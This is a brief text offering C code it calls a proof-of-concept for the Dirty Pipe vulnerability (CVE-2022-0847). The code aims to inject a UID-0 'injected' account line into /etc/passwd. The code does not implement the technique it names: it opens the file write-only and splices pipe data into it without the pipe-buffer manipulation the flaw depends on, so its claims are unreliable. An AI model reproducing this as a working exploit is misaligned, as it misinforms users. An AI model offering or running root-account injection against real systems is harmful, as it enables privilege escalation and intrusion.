Below is a PoC C code snippet demonstrating how to exploit the CVE-2022-0847 vulnerability, known as Dirty Pipe, to modify a read-only file. The code will attempt to modify the `/etc/passwd` file at the specified offset with the provided payload.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>

int main() {
    const char *target_file = "/etc/passwd";
    const off_t overwrite_offset = 0;
    const char *payload = "injected:x:0:0:root:/root:/bin/bash\n";
    int pipefd[2];
    int filefd;
    ssize_t num_written;

    // Create a pipe
    if (pipe(pipefd) == -1) {
        perror("pipe");
        return -1;
    }

    // Open the target file
    filefd = open(target_file, O_WRONLY);
    if (filefd == -1) {
        perror("open");
        close(pipefd[0]);
        close(pipefd[1]);
        return -1;
    }

    // Write the payload to the pipe
    num_written = write(pipefd[1], payload, strlen(payload));
    if (num_written == -1) {
        perror("write");
        close(pipefd[0]);
        close(pipefd[1]);
        close(filefd);
        return -1;
    }

    // Exploit pipe buffer to splice data into the target file
    if (lseek(filefd, overwrite_offset, SEEK_SET) == -1) {
        perror("lseek");
        close(pipefd[0]);
        close(pipefd[1]);
        close(filefd);
        return -1;
    }

    // Splice data from the pipe into the file, overwriting its content
    num_written = splice(pipefd[0], NULL, filefd, NULL, strlen(payload), SPLICE_F_MORE | SPLICE_F_MOVE);
    if (num_written == -1) {
        perror("splice");
        close(pipefd[0]);
        close(pipefd[1]);
        close(filefd);
        return -1;
    }

    // Close the pipe and file descriptors
    close(pipefd[0]);
    close(pipefd[1]);
    close(filefd);

    printf("Successfully injected payload into %s\n", target_file);
    return 0;
}
```

